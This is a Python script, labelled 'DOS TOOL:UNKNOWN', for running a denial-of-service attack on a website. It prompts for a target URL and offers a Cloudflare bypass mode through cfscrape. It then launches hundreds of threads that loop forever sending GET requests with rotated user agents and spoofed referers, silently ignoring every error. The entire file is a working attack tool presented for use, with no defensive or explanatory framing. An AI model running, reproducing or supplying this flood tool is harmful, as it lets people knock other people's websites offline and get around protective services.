import os, threading, time, random, sys, random, string, cfscrape, requests

ref = {
    "https://duckduckgo.com/",
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yandex.ru/",
    "https://search.yahoo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.youtube.com/",
}

userAgents = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0",
}

scraper = cfscrape.create_scraper()


class Spammer(threading.Thread):
    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.Lock = threading.Lock()

    def cloudRequest(self):
        soso = scraper.get(self.url, timeout=10)
        print(
            f"| Thread #{self.num} | CLOUDFLARE METHOD | Target: {self.url} | HTTP Status: {soso.status_code} |"
        )

    def defaultRequest(self):
        ro = requests.get(
            self.url,
            timeout=10,
            headers={
                "User-Agent": random.choice(userAgents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "DNT": "1",
                "Referer": random.choice(ref),
            },
        )
        print(
            f"| Thread #{self.num} | NORMAL METHOD | Target: {self.url} | HTTP Status: {ro.status_code} |"
        )

    def run(self):
        while True:
            try:
                if cloudMode:
                    self.cloudRequest()
                else:
                    self.defaultRequest()
            except:
                pass


class MainLoop:
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system("cls")
            os.system("title DOS TOOL:UNKNOWN")
            os.system("color a")
            colors = ["a", "b", "c", "d", "e", "f"]
            os.system(f"color {random.choice(colors)}")
        print("#" * 30)
        print("DOS TOOL:UNKNOWN")
        print("#" * 30)

    def urlCheck(self, url):
        if url[0] + url[1] + url[2] + url[3] == "www.":
            url = "http://" + url
        elif url[0] + url[1] + url[2] + url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url

    def setup(self):
        global cloudMode
        while True:
            try:
                url = input("Enter Url to DoS> ")
                url = self.urlCheck(url)
                sosi = requests.head(url)
                break
            except:
                print("An issue was accoured with the url")
        while True:
            try:
                methodChoice = input("[y]Cloudflare Bypass | [Enter]Normal Attack> ")
                if methodChoice == "y":
                    cloudMode = True
                    break
                else:
                    cloudMode = False
                    break
            except:
                pass
        while True:
            try:
                threadsQuantity = int(input("Enter the ammount of threads[800]> "))
            except:
                threadsQuantity = 800
            break
        print("::" * 30)
        print(
            f"Target: {url}\nCloudFlare Bypass: {cloudMode}\nThreads: {threadsQuantity}"
        )
        print("Starting in 5 seconds")
        print("::" * 30)
        time.sleep(5)
        for i in range(threadsQuantity):
            Spammer(url, i + 1).start()


if __name__ == "__main__":
    starter = MainLoop()
    starter.setup()
